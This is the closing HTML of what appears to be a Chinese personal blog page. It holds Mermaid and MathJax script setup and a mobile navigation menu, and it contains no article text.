  <script src='https://unpkg.com/mermaid@7.1.2/dist/mermaid.min.js'></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize({theme: 'forest'});
    }
  </script>

    </div>
    <nav id="mobile-nav" class="mobile-nav-box">
  <div class="mobile-nav-img mobile-nav-top"></div>
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
    <a href="/introduction" class="mobile-nav-link">关于我</a>
  
    <a href="/log" class="mobile-nav-link">站点日志</a>
  
  <div class="mobile-nav-img  mobile-nav-bottom"></div>
</nav>    
  </div>
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });
</script>
<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
</body>
</html>